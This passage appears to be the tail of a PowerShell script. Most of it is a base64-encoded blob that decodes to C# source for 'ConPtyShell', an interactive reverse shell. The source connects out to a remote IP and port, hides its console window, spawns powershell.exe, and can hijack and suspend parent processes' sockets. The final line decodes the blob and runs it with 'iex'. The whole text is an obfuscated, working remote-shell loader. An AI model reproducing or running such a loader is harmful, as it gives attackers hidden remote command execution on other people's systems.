sIHJlZiBJc1NvY2tldE92ZXJsYXBwZWQpOwogICAgICAgICAgICAgICAgaWYgKHNoZWxsU29ja2V0ID09IEludFB0ci5aZXJvICYmIHBhcmVudFByb2Nlc3MgIT0gbnVsbCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAvLyBpZiBubyBzb2NrZXRzIGFyZSBmb3VuZCBpbiB0aGUgY3VycmVudCBwcm9jZXNzIHdlIHRyeSB0byBoaWphY2sgb3VyIGN1cnJlbnQgcGFyZW50IHByb2Nlc3Mgc29ja2V0CiAgICAgICAgICAgICAgICAgICAgc2hlbGxTb2NrZXQgPSBTb2NrZXRIaWphY2tpbmcuRHVwbGljYXRlVGFyZ2V0UHJvY2Vzc1NvY2tldChwYXJlbnRQcm9jZXNzLCByZWYgSXNTb2NrZXRPdmVybGFwcGVkKTsKICAgICAgICAgICAgICAgICAgICBpZiAoc2hlbGxTb2NrZXQgPT0gSW50UHRyLlplcm8gJiYgZ3JhbmRQYXJlbnRQcm9jZXNzICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAvLyBkYW1uLCBldmVuIHRoZSBwYXJlbnQgcHJvY2VzcyBoYXMgbm8gdXNhYmxlIHNvY2tldHMsIGxldCdzIHRyeSBhIGxhc3QgZGVzcGVyYXRlIGF0dGVtcHQgaW4gdGhlIGdyYW5kcGFyZW50IHByb2Nlc3MKICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGxTb2NrZXQgPSBTb2NrZXRIaWphY2tpbmcuRHVwbGljYXRlVGFyZ2V0UHJvY2Vzc1NvY2tldChncmFuZFBhcmVudFByb2Nlc3MsIHJlZiBJc1NvY2tldE92ZXJsYXBwZWQpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc2hlbGxTb2NrZXQgPT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiTm8gXFxEZXZpY2VcXEFmZCBvYmplY3RzIGZvdW5kLiBTb2NrZXQgZHVwbGljYXRpb24gZmFpbGVkLiIpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JhbmRQYXJlbnRTb2NrZXRJbmhlcml0ZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGdvdGNoYSBhIHVzYWJsZSBzb2NrZXQgZnJvbSB0aGUgcGFyZW50IHByb2Nlc3MsIGxldCdzIHNlZSBpZiB0aGUgZ3JhbmRQYXJlbnQgYWxzbyB1c2UgdGhlIHNvY2tldAogICAgICAgICAgICAgICAgICAgICAgICBwYXJlbnRTb2NrZXRJbmhlcml0ZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZ3JhbmRQYXJlbnRQcm9jZXNzICE9IG51bGwpIGdyYW5kUGFyZW50U29ja2V0SW5oZXJpdGVkID0gU29ja2V0SGlqYWNraW5nLklzU29ja2V0SW5oZXJpdGVkKHNoZWxsU29ja2V0LCBncmFuZFBhcmVudFByb2Nlc3MpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAvLyB0aGUgY3VycmVudCBwcm9jZXNzIGdvdCBhIHVzYWJsZSBzb2NrZXQsIGxldCdzIHNlZSBpZiB0aGUgcGFyZW50cyB1c2UgdGhlIHNvY2tldAogICAgICAgICAgICAgICAgICAgIGlmIChwYXJlbnRQcm9jZXNzICE9IG51bGwpIHBhcmVudFNvY2tldEluaGVyaXRlZCA9IFNvY2tldEhpamFja2luZy5Jc1NvY2tldEluaGVyaXRlZChzaGVsbFNvY2tldCwgcGFyZW50UHJvY2Vzcyk7CiAgICAgICAgICAgICAgICAgICAgaWYgKGdyYW5kUGFyZW50UHJvY2VzcyAhPSBudWxsKSBncmFuZFBhcmVudFNvY2tldEluaGVyaXRlZCA9IFNvY2tldEhpamFja2luZy5Jc1NvY2tldEluaGVyaXRlZChzaGVsbFNvY2tldCwgZ3JhbmRQYXJlbnRQcm9jZXNzKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHNoZWxsU29ja2V0ID0gY29ubmVjdFJlbW90ZShyZW1vdGVJcCwgcmVtb3RlUG9ydCk7CiAgICAgICAgICAgICAgICBpZiAoc2hlbGxTb2NrZXQgPT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgb3V0cHV0ICs9IHN0cmluZy5Gb3JtYXQoInswfUNvdWxkIG5vdCBjb25uZWN0IHRvIGlwIHsxfSBvbiBwb3J0IHsyfSIsIGVycm9yU3RyaW5nLCByZW1vdGVJcCwgcmVtb3RlUG9ydC5Ub1N0cmluZygpKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gb3V0cHV0OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgVHJ5UGFyc2VSb3dzQ29sc0Zyb21Tb2NrZXQoc2hlbGxTb2NrZXQsIHJlZiByb3dzLCByZWYgY29scyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKEdldENvbnNvbGVXaW5kb3coKSA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQWxsb2NDb25zb2xlKCk7CiAgICAgICAgICAgICAgICBTaG93V2luZG93KEdldENvbnNvbGVXaW5kb3coKSwgU1dfSElERSk7CiAgICAgICAgICAgICAgICBuZXdDb25zb2xlQWxsb2NhdGVkID0gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvLyBkZWJ1ZyBjb2RlIGZvciBjaGVja2luZyBoYW5kbGUgZHVwbGljYXRpb24KICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBDcmVhdGluZyBwc2V1ZG8gY29uc29sZS4uLiIpOwogICAgICAgICAgICAvLyBUaHJlYWQuU2xlZXAoMTgwMDAwKTsKICAgICAgICAgICAgLy8gcmV0dXJuICIiOwogICAgICAgICAgICBpbnQgcHNldWRvQ29uc29sZUNyZWF0aW9uUmVzdWx0ID0gQ3JlYXRlUHNldWRvQ29uc29sZVdpdGhQaXBlcyhyZWYgaGFuZGxlUHNldWRvQ29uc29sZSwgcmVmIElucHV0UGlwZVJlYWQsIHJlZiBPdXRwdXRQaXBlV3JpdGUsIHJvd3MsIGNvbHMpOwogICAgICAgICAgICBpZiAocHNldWRvQ29uc29sZUNyZWF0aW9uUmVzdWx0ICE9IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIG91dHB1dCArPSBzdHJpbmcuRm9ybWF0KCJ7MH1Db3VsZCBub3QgY3JlYXRlIHBzdWVkbyBjb25zb2xlLiBFcnJvciBDb2RlIHsxfSIsIGVycm9yU3RyaW5nLCBwc2V1ZG9Db25zb2xlQ3JlYXRpb25SZXN1bHQuVG9TdHJpbmcoKSk7CiAgICAgICAgICAgICAgICByZXR1cm4gb3V0cHV0OwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNoaWxkUHJvY2Vzc0luZm8gPSBDcmVhdGVDaGlsZFByb2Nlc3NXaXRoUHNldWRvQ29uc29sZShoYW5kbGVQc2V1ZG9Db25zb2xlLCBjb21tYW5kTGluZSk7CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGlmICh1cGdyYWRlU2hlbGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIG91dHB1dCArPSBzdHJpbmcuRm9ybWF0KCJDb3VsZCBub3QgdXBncmFkZSBzaGVsbCB0byBmdWxseSBpbnRlcmFjdGl2ZSBiZWNhdXNlIENvblBUWSBpcyBub3QgY29tcGF0aWJsZSBvbiB0aGlzIHN5c3RlbSIpOwogICAgICAgICAgICAgICAgcmV0dXJuIG91dHB1dDsKICAgICAgICAgICAgfQogICAgICAgICAgICBzaGVsbFNvY2tldCA9IGNvbm5lY3RSZW1vdGUocmVtb3RlSXAsIHJlbW90ZVBvcnQpOwogICAgICAgICAgICBpZiAoc2hlbGxTb2NrZXQgPT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIG91dHB1dCArPSBzdHJpbmcuRm9ybWF0KCJ7MH1Db3VsZCBub3QgY29ubmVjdCB0byBpcCB7MX0gb24gcG9ydCB7Mn0iLCBlcnJvclN0cmluZywgcmVtb3RlSXAsIHJlbW90ZVBvcnQuVG9TdHJpbmcoKSk7CiAgICAgICAgICAgICAgICByZXR1cm4gb3V0cHV0OwogICAgICAgICAgICB9CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJcclxuQ3JlYXRlUHNldWRvQ29uc29sZSBmdW5jdGlvbiBub3QgZm91bmQhIFNwYXduaW5nIGEgbmV0Y2F0LWxpa2UgaW50ZXJhY3RpdmUgc2hlbGwuLi5cclxuIik7CiAgICAgICAgICAgIFNUQVJUVVBJTkZPIHNJbmZvID0gbmV3IFNUQVJUVVBJTkZPKCk7CiAgICAgICAgICAgIHNJbmZvLmNiID0gTWFyc2hhbC5TaXplT2Yoc0luZm8pOwogICAgICAgICAgICBzSW5mby5kd0ZsYWdzIHw9IChJbnQzMilTVEFSVEZfVVNFU1RESEFORExFUzsKICAgICAgICAgICAgc0luZm8uaFN0ZElucHV0ID0gSW5wdXRQaXBlUmVhZDsKICAgICAgICAgICAgc0luZm8uaFN0ZE91dHB1dCA9IE91dHB1dFBpcGVXcml0ZTsKICAgICAgICAgICAgc0luZm8uaFN0ZEVycm9yID0gT3V0cHV0UGlwZVdyaXRlOwogICAgICAgICAgICBDcmVhdGVQcm9jZXNzKG51bGwsIGNvbW1hbmRMaW5lLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIHRydWUsIDAsIEludFB0ci5aZXJvLCBudWxsLCByZWYgc0luZm8sIG91dCBjaGlsZFByb2Nlc3NJbmZvKTsKICAgICAgICB9CiAgICAgICAgLy8gTm90ZTogV2UgY2FuIGNsb3NlIHRoZSBoYW5kbGVzIHRvIHRoZSBQVFktZW5kIG9mIHRoZSBwaXBlcyBoZXJlCiAgICAgICAgLy8gYmVjYXVzZSB0aGUgaGFuZGxlcyBhcmUgZHVwJ2VkIGludG8gdGhlIENvbkhvc3QgYW5kIHdpbGwgYmUgcmVsZWFzZWQKICAgICAgICAvLyB3aGVuIHRoZSBDb25QVFkgaXMgZGVzdHJveWVkLgogICAgICAgIGlmIChJbnB1dFBpcGVSZWFkICE9IEludFB0ci5aZXJvKSBDbG9zZUhhbmRsZShJbnB1dFBpcGVSZWFkKTsKICAgICAgICBpZiAoT3V0cHV0UGlwZVdyaXRlICE9IEludFB0ci5aZXJvKSBDbG9zZUhhbmRsZShPdXRwdXRQaXBlV3JpdGUpOwogICAgICAgIGlmICh1cGdyYWRlU2hlbGwpIHsKICAgICAgICAgICAgLy8gd2UgbmVlZCB0byBzdXNwZW5kIG90aGVyIHByb2Nlc3NlcyB0aGF0IGNhbiBpbnRlcmFjdCB3aXRoIHRoZSBkdXBsaWNhdGVkIHNvY2tldHMgaWYgYW55LiBUaGlzIHdpbGwgZW5zdXJlIHN0ZGluLCBzdGRvdXQgYW5kIHN0ZGVyciBpcyByZWFkL3dyaXRlIG9ubHkgYnkgb3VyIGNvbnB0eSBwcm9jZXNzCiAgICAgICAgICAgIGlmIChwYXJlbnRTb2NrZXRJbmhlcml0ZWQpIE50U3VzcGVuZFByb2Nlc3MocGFyZW50UHJvY2Vzcy5IYW5kbGUpOwogICAgICAgICAgICBpZiAoZ3JhbmRQYXJlbnRTb2NrZXRJbmhlcml0ZWQpIE50U3VzcGVuZFByb2Nlc3MoZ3JhbmRQYXJlbnRQcm9jZXNzLkhhbmRsZSk7CiAgICAgICAgICAgIGlmICghSXNTb2NrZXRPdmVybGFwcGVkKSBTb2NrZXRIaWphY2tpbmcuU2V0U29ja2V0QmxvY2tpbmdNb2RlKHNoZWxsU29ja2V0LCAxKTsKICAgICAgICB9CiAgICAgICAgLy9UaHJlYWRzIGhhdmUgYmV0dGVyIHBlcmZvcm1hbmNlIHRoYW4gVGFza3MKICAgICAgICBUaHJlYWQgdGhUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0ID0gU3RhcnRUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0KE91dHB1dFBpcGVSZWFkLCBzaGVsbFNvY2tldCwgSXNTb2NrZXRPdmVybGFwcGVkKTsKICAgICAgICBUaHJlYWQgdGhSZWFkU29ja2V0V3JpdGVQaXBlID0gU3RhcnRUaHJlYWRSZWFkU29ja2V0V3JpdGVQaXBlKElucHV0UGlwZVdyaXRlLCBzaGVsbFNvY2tldCwgY2hpbGRQcm9jZXNzSW5mby5oUHJvY2VzcywgSXNTb2NrZXRPdmVybGFwcGVkKTsKICAgICAgICAvLyB3YWl0IGZvciB0aGUgY2hpbGQgcHJvY2VzcyB1bnRpbCBleGl0CiAgICAgICAgV2FpdEZvclNpbmdsZU9iamVjdChjaGlsZFByb2Nlc3NJbmZvLmhQcm9jZXNzLCBJTkZJTklURSk7CiAgICAgICAgLy9jbGVhbnVwIGV2ZXJ5dGhpbmcKICAgICAgICB0aFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQuQWJvcnQoKTsKICAgICAgICB0aFJlYWRTb2NrZXRXcml0ZVBpcGUuQWJvcnQoKTsKICAgICAgICBpZiAodXBncmFkZVNoZWxsKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCFJc1NvY2tldE92ZXJsYXBwZWQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vIGNhbmNlbGxpbmcgdGhlIGV2ZW50IHNlbGVjdGlvbiBmb3IgdGhlIHNvY2tldAogICAgICAgICAgICAgICAgV1NBRXZlbnRTZWxlY3Qoc2hlbGxTb2NrZXQsIEludFB0ci5aZXJvLCAwKTsKICAgICAgICAgICAgICAgIFNvY2tldEhpamFja2luZy5TZXRTb2NrZXRCbG9ja2luZ01vZGUoc2hlbGxTb2NrZXQsIDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChwYXJlbnRTb2NrZXRJbmhlcml0ZWQpIE50UmVzdW1lUHJvY2VzcyhwYXJlbnRQcm9jZXNzLkhhbmRsZSk7CiAgICAgICAgICAgIGlmIChncmFuZFBhcmVudFNvY2tldEluaGVyaXRlZCkgTnRSZXN1bWVQcm9jZXNzKGdyYW5kUGFyZW50UHJvY2Vzcy5IYW5kbGUpOwogICAgICAgIH0KICAgICAgICBjbG9zZXNvY2tldChzaGVsbFNvY2tldCk7CiAgICAgICAgUmVzdG9yZVN0ZEhhbmRsZXMob2xkU3RkSW4sIG9sZFN0ZE91dCwgb2xkU3RkRXJyKTsKICAgICAgICBpZiAobmV3Q29uc29sZUFsbG9jYXRlZCkKICAgICAgICAgICAgRnJlZUNvbnNvbGUoKTsKICAgICAgICBDbG9zZUhhbmRsZShjaGlsZFByb2Nlc3NJbmZvLmhUaHJlYWQpOwogICAgICAgIENsb3NlSGFuZGxlKGNoaWxkUHJvY2Vzc0luZm8uaFByb2Nlc3MpOwogICAgICAgIGlmIChoYW5kbGVQc2V1ZG9Db25zb2xlICE9IEludFB0ci5aZXJvKSBDbG9zZVBzZXVkb0NvbnNvbGUoaGFuZGxlUHNldWRvQ29uc29sZSk7CiAgICAgICAgaWYgKElucHV0UGlwZVdyaXRlICE9IEludFB0ci5aZXJvKSBDbG9zZUhhbmRsZShJbnB1dFBpcGVXcml0ZSk7CiAgICAgICAgaWYgKE91dHB1dFBpcGVSZWFkICE9IEludFB0ci5aZXJvKSBDbG9zZUhhbmRsZShPdXRwdXRQaXBlUmVhZCk7CiAgICAgICAgb3V0cHV0ICs9ICJDb25QdHlTaGVsbCBraW5kbHkgZXhpdGVkLlxyXG4iOwogICAgICAgIHJldHVybiBvdXRwdXQ7CiAgICB9Cn0KCnB1YmxpYyBzdGF0aWMgY2xhc3MgQ29uUHR5U2hlbGxNYWluQ2xhc3MKewogICAgcHJpdmF0ZSBzdGF0aWMgc3RyaW5nIGhlbHAgPSBAIiI7CgogICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBIZWxwUmVxdWlyZWQoc3RyaW5nIHBhcmFtKQogICAgewogICAgICAgIHJldHVybiBwYXJhbSA9PSAiLWgiIHx8IHBhcmFtID09ICItLWhlbHAiIHx8IHBhcmFtID09ICIvPyI7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBDaGVja0FyZ3Moc3RyaW5nW10gYXJndW1lbnRzKQogICAgewogICAgICAgIGlmIChhcmd1bWVudHMuTGVuZ3RoIDwgMikKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJcclxuQ29uUHR5U2hlbGw6IE5vdCBlbm91Z2ggYXJndW1lbnRzLiAyIEFyZ3VtZW50cyByZXF1aXJlZC4gVXNlIC0taGVscCBmb3IgYWRkaXRpb25hbCBoZWxwLlxyXG4iKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIERpc3BsYXlIZWxwKCkKICAgIHsKICAgICAgICBDb25zb2xlLk91dC5Xcml0ZShoZWxwKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgQ2hlY2tSZW1vdGVJcEFyZyhzdHJpbmcgaXBTdHJpbmcpCiAgICB7CiAgICAgICAgSVBBZGRyZXNzIGFkZHJlc3M7CiAgICAgICAgaWYgKCFJUEFkZHJlc3MuVHJ5UGFyc2UoaXBTdHJpbmcsIG91dCBhZGRyZXNzKSkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJcclxuQ29uUHR5U2hlbGw6IEludmFsaWQgcmVtb3RlSXAgdmFsdWUiICsgaXBTdHJpbmcpOwogICAgICAgIHJldHVybiBpcFN0cmluZzsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBpbnQgQ2hlY2tJbnQoc3RyaW5nIGFyZykKICAgIHsKICAgICAgICBpbnQgcmV0ID0gMDsKICAgICAgICBpZiAoIUludDMyLlRyeVBhcnNlKGFyZywgb3V0IHJldCkpCiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiXHJcbkNvblB0eVNoZWxsOiBJbnZhbGlkIGludGVnZXIgdmFsdWUgIiArIGFyZyk7CiAgICAgICAgcmV0dXJuIHJldDsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB1aW50IFBhcnNlUm93cyhzdHJpbmdbXSBhcmd1bWVudHMpCiAgICB7CiAgICAgICAgdWludCByb3dzID0gMjQ7CiAgICAgICAgaWYgKGFyZ3VtZW50cy5MZW5ndGggPiAyKQogICAgICAgICAgICByb3dzID0gKHVpbnQpQ2hlY2tJbnQoYXJndW1lbnRzWzJdKTsKICAgICAgICByZXR1cm4gcm93czsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB1aW50IFBhcnNlQ29scyhzdHJpbmdbXSBhcmd1bWVudHMpCiAgICB7CiAgICAgICAgdWludCBjb2xzID0gODA7CiAgICAgICAgaWYgKGFyZ3VtZW50cy5MZW5ndGggPiAzKQogICAgICAgICAgICBjb2xzID0gKHVpbnQpQ2hlY2tJbnQoYXJndW1lbnRzWzNdKTsKICAgICAgICByZXR1cm4gY29sczsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgUGFyc2VDb21tYW5kTGluZShzdHJpbmdbXSBhcmd1bWVudHMpCiAgICB7CiAgICAgICAgc3RyaW5nIGNvbW1hbmRMaW5lID0gInBvd2Vyc2hlbGwuZXhlIjsKICAgICAgICBpZiAoYXJndW1lbnRzLkxlbmd0aCA+IDQpCiAgICAgICAgICAgIGNvbW1hbmRMaW5lID0gYXJndW1lbnRzWzRdOwogICAgICAgIHJldHVybiBjb21tYW5kTGluZTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBDb25QdHlTaGVsbE1haW4oc3RyaW5nW10gYXJncykKICAgIHsKICAgICAgICBzdHJpbmcgb3V0cHV0ID0gIiI7CiAgICAgICAgaWYgKGFyZ3MuTGVuZ3RoID09IDEgJiYgSGVscFJlcXVpcmVkKGFyZ3NbMF0pKQogICAgICAgIHsKICAgICAgICAgICAgRGlzcGxheUhlbHAoKTsKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgc3RyaW5nIHJlbW90ZUlwID0gIiI7CiAgICAgICAgICAgIGludCByZW1vdGVQb3J0ID0gMDsKICAgICAgICAgICAgYm9vbCB1cGdyYWRlU2hlbGwgPSBmYWxzZTsKICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENoZWNrQXJncyhhcmdzKTsKICAgICAgICAgICAgICAgIGlmIChhcmdzWzBdLkNvbnRhaW5zKCJ1cGdyYWRlIikpCiAgICAgICAgICAgICAgICAgICAgdXBncmFkZVNoZWxsID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICByZW1vdGVJcCA9IENoZWNrUmVtb3RlSXBBcmcoYXJnc1swXSk7CiAgICAgICAgICAgICAgICAgICAgcmVtb3RlUG9ydCA9IENoZWNrSW50KGFyZ3NbMV0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgdWludCByb3dzID0gUGFyc2VSb3dzKGFyZ3MpOwogICAgICAgICAgICAgICAgdWludCBjb2xzID0gUGFyc2VDb2xzKGFyZ3MpOwogICAgICAgICAgICAgICAgc3RyaW5nIGNvbW1hbmRMaW5lID0gUGFyc2VDb21tYW5kTGluZShhcmdzKTsKICAgICAgICAgICAgICAgIG91dHB1dCA9IENvblB0eVNoZWxsLlNwYXduQ29uUHR5U2hlbGwocmVtb3RlSXAsIHJlbW90ZVBvcnQsIHJvd3MsIGNvbHMsIGNvbW1hbmRMaW5lLCB1cGdyYWRlU2hlbGwpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlxuIiArIGUuVG9TdHJpbmcoKSArICJcbiIpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBvdXRwdXQ7CiAgICB9Cn0KCgpjbGFzcyBNYWluQ2xhc3MKewogICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgewogICAgICAgIENvbnNvbGUuT3V0LldyaXRlKENvblB0eVNoZWxsTWFpbkNsYXNzLkNvblB0eVNoZWxsTWFpbihhcmdzKSk7CiAgICB9Cn0KCiJAOw=="
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($powershell_encoded)) | iex